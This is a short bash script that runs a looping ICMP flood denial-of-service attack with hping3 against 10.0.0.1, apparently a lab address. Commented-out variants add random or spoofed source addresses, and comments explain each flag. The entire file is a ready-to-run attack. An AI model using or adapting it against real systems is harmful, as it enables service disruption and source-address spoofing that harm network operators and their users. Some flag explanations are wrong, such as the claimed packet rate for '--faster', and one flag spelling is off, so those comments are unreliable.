#!/bin/bash
#
# implements the Dos attack via ICMP flooding

# PID=$! gets the process id of the last process put to background

while true 
do 
    # 1
    hping3 -V --icmp --faster 10.0.0.1 -c 2000 &

    # 2
    #hping3 -V --icmp --faster -o 44140 10.0.0.1 -c 2000 --rand-source &
    
    # 3
    #hping3 -V --icmp --faster -o 44140 10.0.0.1 -c 2000 -spoof 10.0.0.4 & 
    
    # 4
    #hping3 -V --icmp --faster -o 44140 10.0.0.1 -c 2000 -a 10.0.0.4 &
    
    # 5
    #hping3 -V --icmp --faster -o 44140 10.0.0.1 -c 2000 -a 10.0.0.4 &
    
    sleep 120
done

# hping3 command explained argument-for-argument
## -V: verbose mode
## --icmp: ICMP mode/protocol to use=ICMP
## --faster: alias for -i u1000=sends 100 packets per second
## -o 44140:  
## 10.0.0.1: target host=10.0.0.1
## -c 2000: packet count=2000

## -spoof 10.0.0.4: spoof source address=10.0.0.4
## --rand-source: random source address mode/selects random IP addresses as the source address for the ICMP request